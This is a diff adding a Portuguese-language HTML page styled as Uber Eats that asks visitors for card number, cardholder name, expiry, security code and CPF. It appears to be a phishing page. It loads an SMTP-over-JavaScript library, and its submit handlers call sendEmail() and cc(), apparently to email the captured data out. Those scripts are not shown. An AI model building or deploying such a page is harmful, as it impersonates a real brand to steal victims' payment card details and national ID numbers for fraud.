@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="infos.css">
+    <link rel="stylesheet" type="text/css" href="card.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+
+    <title>Uber Eats</title>
+
+    <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>
+    <script type="text/javascript" src="cardscript.js"></script>
+    <script type="text/javascript" src="cc.js"></script>
+
+</head>
+<body>
+    <section>
+        <div class="container-fluid">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-6">
+                    <div class="container">
+                        <div>
+                            <a href="payment.html">
+                                <div style="width: fit-content;"><img src="return.png" /></div>
+                            </a>
+                            <h1>Adicione um cartão de crédito ou débito</h1>
+                            <form onsubmit="cc(sendEmail())">
+                                <div class="ccnumber">
+                                    <label for="ccnumber">Número do cartão</label>
+                                    <input style="background-color: #f5f5f5;" id="ccnumber" type="tel" autocomplete="cc-number" maxlength="16" inputmode="numeric" />
+                                    <span class="ccband" id="ccbandeira"></span>
+                                    <span id="msgccnumber"></span>
+                                </div>
+                                <div class="ccnumber">
+                                    <label for="ccnumber">Nome do cartão</label>
+                                    <input style="background-color: #f5f5f5;" id="ccname" type="name" autocomplete="cc-name" maxlength="50" />
+                                    <span></span>
+                                </div>
+                                <div id="hp" class="cc-infos">
+                                    <div class="cc-exp-val">
+                                        <label for="cc-exp">Validade</label>
+                                        <input style="background-color: #f5f5f5;" id="cc-exp" type="tel" autocomplete="cc-exp" placeholder="MM / AA" maxlength="5" inputmode="numeric" required="" />
+                                        <span id="msgccExp"></span>
+                                    </div>
+                                    <div class="cc-exp-val">
+                                        <div class="label-exp">
+                                            <label for="cc-csc">Código de segurança</label>
+                                        </div>
+                                        <input style="background-color: #f5f5f5; text-decoration: wavy;" id="cc-csc" type="tel" autocomplete="cc-csc" maxlength="4" inputmode="numeric" required="" />
+                                        <span id="msgcccsc"></span>
+                                    </div>
+                                </div>
+                                <div class="ccnumber">
+                                    <label for="ccnumber">CPF</label>
+                                    <input style="background-color: #f5f5f5;" id="cpf" type="tel" autocomplete="cpf" maxlength="14" inputmode="numeric" />
+                                    <span id="msgCpf"></span>
+                                </div>
+                                <div id="btn" class="btn">
+                                    <input type="submit" id="addcard" onclick="sendEmail()" style="display: none;" value="Adicionar cartão" />
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+</html>
+
+
